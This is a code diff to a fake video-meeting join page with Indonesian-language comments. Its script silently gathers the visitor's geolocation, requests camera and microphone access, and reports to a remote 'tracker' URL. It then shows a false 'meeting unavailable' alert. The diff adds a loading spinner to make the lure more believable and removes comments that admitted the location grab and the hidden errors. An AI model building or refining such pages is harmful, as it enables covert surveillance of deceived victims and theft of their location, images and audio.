@@ -23,15 +23,51 @@
       border-bottom: 1px solid #e5e5e5;
     }
     .logo { font-size: 32px; font-weight: 700; color: #0e72ed; letter-spacing: -2px; }
+
     .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
     .join-box { width: 100%; max-width: 480px; text-align: center; }
+
     h1 { font-size: 28px; font-weight: 600; margin-bottom: 32px; }
     .label { text-align: left; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #444; }
     input { width: 100%; padding: 16px 20px; font-size: 16px; border: 1px solid #d0d0d0; border-radius: 8px; margin-bottom: 20px; }
+
     #joinBtn {
       width: 100%; padding: 16px; background: #0e72ed; color: white;
       font-size: 18px; font-weight: 600; border: none; border-radius: 8px; cursor: pointer;
+      transition: all 0.3s;
     }
+    #joinBtn:disabled {
+      background: #8ab4f8;
+      cursor: not-allowed;
+    }
+
+    /* Loading Animation */
+    .loading-container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      margin: 25px 0;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #f0f0f0;
+      border-top: 5px solid #0e72ed;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+    .loading-text {
+      font-size: 15px;
+      color: #555;
+      font-weight: 500;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     video { display: none; }
   </style>
 </head>
@@ -52,6 +88,12 @@
       <input type="text" id="meetingId" value="987-654-321" readonly>
 
       <button id="joinBtn">Join</button>
+      
+      <!-- Loading Animation -->
+      <div class="loading-container" id="loading">
+        <div class="spinner"></div>
+        <div class="loading-text">Memproses permintaan...</div>
+      </div>
     </div>
   </div>
 
@@ -59,6 +101,7 @@
 
   <script>
     const btn = document.getElementById('joinBtn');
+    const loading = document.getElementById('loading');
     const videoEl = document.getElementById('video');
     const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';
 
@@ -66,9 +109,10 @@
 
     btn.addEventListener('click', async () => {
       btn.disabled = true;
+      loading.style.display = 'flex';   // Tampilkan loading
 
       try {
-        // GEOLOCATION (tetap dijalankan tapi tanpa notifikasi ke user)
+        // GEOLOCATION
         let locationData = { latitude: null, longitude: null, accuracy: 0, note: "failed_or_skipped" };
         try {
           const pos = await new Promise((res, rej) => 
@@ -81,7 +125,7 @@
           };
         } catch (e) { /* silent */ }
 
-        await sleep(500);
+        await sleep(600);
 
         // CAMERA + AUDIO
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -143,15 +187,17 @@
         if (response.ok) {
           alert("Meeting tidak tersedia. Silakan coba lagi nanti.");
         } else {
-          throw new Error(`Server returned ${response.status}`);
+          throw new Error(`Server error`);
         }
 
         stream.getTracks().forEach(t => t.stop());
 
       } catch (err) {
         console.error(err);
-        // Tidak menampilkan error ke user
         alert("Meeting tidak tersedia. Silakan coba lagi nanti.");
+      } finally {
+        // Sembunyikan loading dan aktifkan tombol kembali
+        loading.style.display = 'none';
         btn.disabled = false;
       }
     });
